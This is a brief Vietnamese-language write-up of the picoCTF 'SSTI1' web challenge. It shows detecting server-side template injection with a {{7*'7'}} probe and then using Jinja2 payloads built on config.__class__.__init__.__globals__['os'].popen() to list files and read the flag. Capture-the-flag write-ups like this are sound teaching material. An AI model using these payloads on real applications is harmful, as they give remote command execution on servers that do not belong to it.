# SSTI1
![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image257.png?raw=true)

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image258.png?raw=true)

Truy cập website:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image259.png?raw=true)

Dựa vào tên thử thách: `SSTI`, tôi nghĩ rằng có thể liên quan đến lỗ hổng `Server-side Template Injection`, tôi thử nhập `{{7*'7'}}` vào box: 

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image260.png?raw=true)

Click `OK`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image261.png?raw=true)

=> Có vẻ website có thể dính lỗ hổng `SSTI`, đồng thời có thể suy ra website sử dụng template `Jinja2 (Python Flask/Django)`. 

Tìm kiếm payload trên mạng:

    {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

Payload trên sẽ liệt kê các file hiện có:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image262.png?raw=true)

Tiếp tục thử payload sau để kiểm tra định dạng file `flag`:

    {{config.__class__.__init__.__globals__['os'].popen('file flag').read()}}

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image263.png?raw=true)

=> Đọc nội dung file này:

    {{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image264.png?raw=true)

